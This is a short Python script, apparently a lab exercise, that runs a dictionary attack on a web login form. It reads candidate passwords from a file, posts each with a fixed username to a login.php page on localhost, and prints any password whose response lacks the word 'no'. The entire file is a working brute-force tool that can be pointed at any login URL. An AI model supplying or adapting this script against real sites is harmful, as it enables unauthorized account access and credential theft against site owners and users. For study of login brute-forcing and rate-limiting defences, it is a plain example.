#!/usr/bin/env python
import requests

target = "http://127.0.0.1/testscriptlogin/login.php"

def login(usr, passwd):
    response = requests.post(target, data={
        "user": usr,    # "user" is name in form's username
        "password": passwd, # "password" is name in form's password
        "submit":"submit"
    })
    if 'no' not in response.text:                                  # change 'no' to 'login failed' or whatever
        print('Password --> {}'.format(passwd))
        
        
with open("passwordList.txt", "r") as passwordlistFile:
    for line in passwordlistFile:
        word_password = line.strip()
        login('abc', word_password)
